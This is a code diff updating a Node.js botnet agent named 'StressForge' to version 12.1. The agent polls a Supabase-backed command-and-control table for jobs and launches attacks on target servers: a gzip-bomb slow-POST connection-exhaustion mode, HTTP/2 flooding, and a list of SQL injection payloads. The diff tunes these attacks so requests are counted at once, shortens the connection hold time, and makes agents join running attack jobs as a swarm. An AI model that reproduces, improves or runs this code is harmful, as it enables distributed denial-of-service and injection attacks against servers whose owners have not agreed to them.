@@ -1,6 +1,6 @@
 /**
- * STRESSFORGE BOTNET AGENT V12.0 (SINGULARITY)
- * - Feature: BLACK HOLE (Gzip Bomb + Slow POST)
+ * STRESSFORGE BOTNET AGENT V12.1 (SINGULARITY)
+ * - Fix: Black Hole Instant Feedback (Removed 5s delay on UI)
  * - Fix: God Mode Fallback logic for HTTP/1.1
  * - Security: Smart De-Confliction
  */
@@ -38,7 +38,7 @@ const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TA
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V12.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V12.1 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -63,6 +63,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
                 res.on('data', chunk => data += chunk);
                 res.on('end', () => { 
                     if (res.statusCode >= 400) {
+                        if (res.statusCode === 400) console.log('\x1b[33m[DB ERROR] Schema Mismatch. Run DB Repair Tool.\x1b[0m');
                         reject(new Error(`API Error ${res.statusCode}: ${data}`));
                     } else {
                         try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
@@ -76,7 +77,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V12.0 (Singularity). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V12.1 (Singularity). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -127,12 +128,15 @@ const startAttack = (job) => {
                  // We don't care about response, we want to hang
              });
              
-             req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
+             req.on('error', () => { jobFailed++; if(running) setImmediate(performRequest); });
              
              // Send GZIP Bomb chunks slowly
              req.write(GZIP_BOMB);
-             // Keep connection open but don't end it immediately
-             setTimeout(() => { if(running) try { req.end(); jobSuccess++; totalRequests++; } catch(e){} }, 5000);
+             // V12.1 FIX: Count immediately so UI updates
+             totalRequests++;
+             
+             // Keep connection open but don't end it immediately (Reduced to 2s)
+             setTimeout(() => { if(running) try { req.end(); jobSuccess++; } catch(e){} }, 2000);
              
              if (running) setTimeout(performRequest, 10); // Throttle slightly
              return;
@@ -207,7 +211,7 @@ const startAttack = (job) => {
         const rps = Math.floor(totalRequests / elapsed) || 0;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
-        // V9.3 Self-Healing DB Write
+        // V9.3 Self-Healing DB Write (Fallback to legacy if schema fails)
         const statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
         try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } 
         catch(e) { try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps }); } catch(e2) {} }
@@ -215,7 +219,7 @@ const startAttack = (job) => {
         if (duration > 0 && elapsed >= duration) {
             running = false;
             clearInterval(activeLoop);
-            if (h2Session) h2Session.close();
+            if (typeof h2Session !== 'undefined') h2Session.close();
             activeJob = null;
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
         }
@@ -228,6 +232,7 @@ setInterval(async () => {
         const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
         if (jobs && jobs.length > 0) {
             const job = jobs[0];
+            // V9.3 Join Swarm Logic: Agents join running jobs too
             if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
             startAttack(job);
         }
